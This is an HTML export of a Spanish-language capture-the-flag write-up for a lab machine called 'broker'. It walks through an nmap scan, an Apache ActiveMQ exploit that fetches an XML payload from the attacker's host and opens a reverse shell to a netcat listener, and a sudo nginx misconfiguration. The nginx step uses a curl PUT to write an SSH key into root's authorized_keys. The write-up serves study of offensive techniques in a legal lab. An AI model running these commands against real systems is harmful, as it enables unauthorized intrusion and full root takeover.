<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>broker</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="bf6884b2-5d03-42d5-8de3-bfd494dce5d8" class="page sans"><header><h1 class="page-title">broker</h1><p class="page-description"></p></header><div class="page-body"><p id="0b7f8eaa-82c6-446a-8787-b010770d5172" class="">
</p><figure id="34c3225e-e3f7-464b-bb6f-62e37a74df77" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/nmapPorts.png"><img style="width:743px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/nmapPorts.png"/></a></figure><figure id="f2b4dc1d-2e73-4fd2-8bb8-3e4a8ce717c7" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/extractPorts.png"><img style="width:793px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/extractPorts.png"/></a></figure><p id="640e6a81-be2a-4445-b16f-86349df06f01" class="">escaneamos y obtenemos todos los puertos mediante los comandos <code>-p-</code> para q escanee todo el rango de puertos el comando <code>—open</code> para que solo muestre los abiertos. el comando <code>-sS—min-rate 5000</code> para q vaya lo mas rapido posible. el <code>-vvv -n</code> para que no se aplique la resolucion dns y se vayan mostrando las informaciones obtenidas a medida de q aparecen y lo extraemos <code>-oG</code> en formato grepeable al archivo allPorts para despues mediante la utilidad extractPorts podamos extraer los puertos abiertos y usarlos en el siguiente comando.</p><p id="7cd63dc4-2dce-48cf-aa1d-a6c692e260aa" class="">luego de eso se usa el comando <code>nmap -sCV -p&lt;openPorts&gt; &lt;IP_adress&gt; -oN targeted</code> para extraer toda la informacion posible de los puertos abiertos y exportarlas todas al archivo targeted.</p><figure id="84a0b133-b27e-4a48-8c8a-537391279cf7" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-15-19.png"><img style="width:808px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-15-19.png"/></a></figure><p id="042dfd7d-79b1-4261-8ebe-ec31d41ade3e" class="">viendose algo asi.</p><p id="4b967265-62bc-4185-bd14-59f370d07b3c" class="">
</p><p id="1da8426a-bc83-4596-887a-cedecdb7ac73" class="">el escaneo revela un apache ActiveMQ y al buscar en wikis formas de explotarlos obtenemos:
</p><figure id="3d513d20-f90a-4a18-aa52-73b38c339d13" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-18-08.png"><img style="width:918px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-18-08.png"/></a></figure><p id="8408c555-70e6-4234-8704-7f62d3c548a9" class="">nos descargamos los repositorios y comenzamos la configuracion</p><figure id="ebeb39a7-e085-4407-b742-9e9cb7d2358e" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-18-48.png"><img style="width:911px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-18-48.png"/></a></figure><p id="95af89da-376e-4665-9e4e-a29a7203954c" class="">configuramos el <code>fsvenom</code> :</p><figure id="0d323488-a809-4eb8-a3b4-77a0f9080b45" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-19-52.png"><img style="width:834px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-19-52.png"/></a></figure><p id="9635bda2-c925-419e-a392-42bee812d5a7" class="">y editamos el poc-linux.xml para q aparezca nuestra ip como host y la ip de la maquina: </p><figure id="0a12aa16-b62d-4ee0-bd7c-0c941d8926c6" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-21-27.png"><img style="width:867px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-21-27.png"/></a></figure><p id="33874cd3-2c5b-48f6-b143-cf9e8ffb5b87" class="">iniciamos un servidor en <code>python3</code> y nos ponemos en escucha con <code>netcat</code> permitiendonos instaurar una reverse shell:
</p><pre id="d28894c2-dbe4-4ec1-8d6f-6009f2d4aece" class="code"><code>python3 -m http.server 8001 &amp; nc -lvvp 4444</code></pre><p id="7ce1534b-d3f0-4033-b48d-52615c080441" class="">finalmente abrimos un nuevo terminal y ejecutamos este comando:
go run main.go -i 10.129.230.87 -p 61616 -u <a href="http://10.10.14.48:8001/poc-linux.xml">http://10.10.14.48:8001/poc-linux.xml</a></p><figure id="bf0cefe4-afd8-46cf-90eb-8341bc22ebc0" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-24-57.png"><img style="width:798px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-24-57.png"/></a></figure><p id="e242b77d-19c6-4554-922d-bc9491d4a2e7" class="">escalamos privilegios mediante un <code>sudo -l</code></p><figure id="6d373597-bd79-43cc-8046-38bf28d3e0c1" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-25-51.png"><img style="width:768px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-25-51.png"/></a></figure><p id="60c36d62-9a39-44d5-a419-b6ff6d75e7e1" class="">Hay varios enfoques que se podrían tomar en este momento para aprovechar esta configuración y obtener privilegios de root, como el método divulgado en este artículo de Zimbra en 2021, que implicaba escribir un archivo de registro en una biblioteca de objetos compartida cargada por sudo. Sin embargo, optamos por una ruta mucho más simple: utilizaremos el módulo ngx_http_dav_module para escribir nuestra clave SSH pública en el archivo authorized_keys del usuario root. Para hacerlo, comenzamos creando el archivo de configuración malicioso de NGINX, que se ve de la siguiente manera:</p><p id="82e45625-b98d-4958-aec3-584ac77b5d8d" class="">
</p><figure id="5e38d844-a938-4ad3-b009-ac0fd812e5dd" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-28-35.png"><img style="width:370px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-28-35.png"/></a></figure><p id="4d3c238a-9242-4cad-a069-4357d3b7a0ab" class="">user root: Los procesos del trabajador se ejecutarán como root, lo que significa que cuando finalmente carguemos un archivo, también será propiedad de root.
root /: El directorio raíz del documento será el directorio superior del sistema de archivos.
dav_methods PUT: Habilitamos la extensión HTTP WebDAV con el método PUT, que permite a los clientes cargar archivos.</p><p id="4b170f0e-1c6a-4e37-8644-21a7cabfe7dd" class="">lo guardamos para dsp ser usado mediante la flag <code>-c</code> y ejecutamos:</p><figure id="26dbfa02-7e95-430b-91d8-06f5cb729559" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-30-33.png"><img style="width:307px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-30-33.png"/></a></figure><p id="c28eb52a-b823-4a63-98bb-78bac84cefeb" class="">chequeamos puertos abiertos para revisar que todo funcione bien:</p><figure id="789c0701-f972-44b0-8951-26bc4c53b348" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-31-16.png"><img style="width:821px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-31-16.png"/></a></figure><p id="f5e51b44-75a3-4ce7-baac-2229d65bf874" class="">procedemos a crear nuestra public ssh key:</p><figure id="8bb68436-ee60-4e92-921d-58f134cc58af" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-32-19.png"><img style="width:750px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-32-19.png"/></a></figure><figure id="d95abf28-2f11-4404-9c57-51a38aec3cd6" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-32-29.png"><img style="width:338px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-32-29.png"/></a></figure><p id="e1a95cf7-da05-43e1-9291-a4455a0d6c53" class="">Finalmente, usamos <code>CURL</code> para enviar la solicitud <code>PUT</code> que escribirá el archivo. Habiendo establecido el directorio raíz del documento en <code>/</code> , especificamos la ruta completa /<code>root/.ssh/authorized_keys</code> y usamos la bandera <code>-d</code> para establecer el contenido del archivo escrito como nuestra clave pública.</p><p id="3d38fa22-82bf-49a8-bcf5-f716d88f1f9a" class=""><code>curl -X PUT localhost:1337/root/.ssh/authorized_keys -d &quot;$(cat root.pub)”</code></p><p id="ae53b990-123f-450b-a208-e4c07adfd6f9" class="">la request va sin errores asiq como resultado obtenemos acceso como root:</p><p id="06015104-9de4-4e3c-a4c8-a430fe455470" class="">la flag se encuentra en /root/root.txt</p><figure id="34d5d0b0-9d6a-4767-b9c4-2860fd328395" class="image"><a href="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-35-49.png"><img style="width:772px" src="broker%20bf6884b25d0342d58de3bfd494dce5d8/Captura_de_pantalla_-2023-12-06_16-35-49.png"/></a></figure><p id="1728ea02-e017-4419-a9b9-b2a149fdb00d" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>